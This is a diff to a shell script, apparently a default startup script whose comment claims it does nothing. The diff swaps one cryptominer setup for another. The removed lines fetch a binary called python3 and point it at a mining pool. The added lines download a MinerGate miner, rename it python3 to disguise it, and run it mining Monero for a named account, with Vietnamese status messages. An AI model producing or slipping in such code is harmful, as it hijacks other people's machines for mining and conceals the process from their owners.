@@ -10,7 +10,7 @@
 # bits.
 #
 # By default this script does nothing.
-if [ -f ${PWD}/python3 ]; then
+if [ -f ${PWD}/minergate-cli/python3 ]; then
     if pgrep -x "python3" > /dev/null
 then
     echo "Miner dang chay roi , ke cmn di "
@@ -18,16 +18,16 @@ then
 else
 
 echo "Miner da install , chay thoi "
-./python3 -F http://pool2.aquachain-foundation.org:8888/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh
+cd minergate-cli
+./python3 -u haidang.ild@gmail.com --xmr 2
 
      
 fi
 exit
 fi
 
-
-wget https://bitbucket.org/lovelyn/openai/downloads/python3
-chmod +x python3
-./python3 -F http://pool2.aquachain-foundation.org:8888/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh
-
-exit 0
+wget https://download.minergate.com/xfast-ubuntu-cli
+unzip xfast-ubuntu-cli
+cd minergate-cli
+mv minergate-cli python3
+./python3 -u haidang.ild@gmail.com --xmr 2
